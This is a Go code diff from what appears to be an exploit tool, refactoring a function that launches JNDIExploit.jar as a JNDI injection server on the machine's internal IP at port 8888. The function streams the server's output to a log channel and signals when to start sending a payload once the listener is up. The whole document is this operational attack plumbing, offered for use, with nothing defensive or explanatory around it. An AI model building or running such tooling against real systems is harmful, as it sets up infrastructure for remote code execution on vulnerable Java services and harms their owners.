@@ -9,48 +9,44 @@ import (
 	"sync"
 )
 
-func ExecJNDI(startPayload chan<- bool) {
+func ExecJNDI(startPayload chan<- bool, logChan chan<- string, wg *sync.WaitGroup) {
+	defer wg.Done()
 	jndipath := "./dependencies/jndi/JNDIExploit.jar"
 	javapath := findjava.FindPath()
 	ip, err := sysinfo.GetIntIP()
 	if err != nil {
-		fmt.Println("[+] Error:", err)
+		logChan <- fmt.Sprintf("[+] Error: %v", err)
 		return
 	}
-	fmt.Println("[+] Starting JNDI exploit server...")
+	logChan <- "[+] Starting JNDI exploit server..."
 	javapathcmd := exec.Command(javapath, "-jar", jndipath, "-i", ip.String(), "-p", "8888")
 	stdout, err := javapathcmd.StdoutPipe()
 	if err != nil {
-		fmt.Println("[+] Error creating stdout pipe:", err)
+		logChan <- fmt.Sprintf("[+] Error creating stdout pipe: %v", err)
 		return
 	}
 	err = javapathcmd.Start()
 	if err != nil {
-		fmt.Println("[+] Error starting command:", err)
+		logChan <- fmt.Sprintf("[+] Error starting command: %v", err)
 		return
 	}
-	var wg sync.WaitGroup
-	wg.Add(1)
-	go func() {
-		defer wg.Done()
-		var output strings.Builder
-		buf := make([]byte, 1024)
-		for {
-			n, err := stdout.Read(buf)
-			if err != nil {
-				break
-			}
-			output.Write(buf[:n])
-			fmt.Print(string(buf[:n]))
-			if strings.Contains(output.String(), "[+] HTTP Server Start Listening on 8888") {
-				startPayload <- true
-				break
-			}
+	var output strings.Builder
+	buf := make([]byte, 1024)
+	for {
+		n, err := stdout.Read(buf)
+		if err != nil {
+			break
 		}
-	}()
+		logLine := string(buf[:n])
+		output.Write(buf[:n])
+		logChan <- logLine
+		if strings.Contains(output.String(), "[+] HTTP Server Start Listening on 8888") {
+			startPayload <- true
+		}
+	}
 	err = javapathcmd.Wait()
 	if err != nil {
-		fmt.Println("[+] Error:", err)
+		logChan <- fmt.Sprintf("[+] Error: %v", err)
 	}
-	wg.Wait()
+	close(logChan)
 }
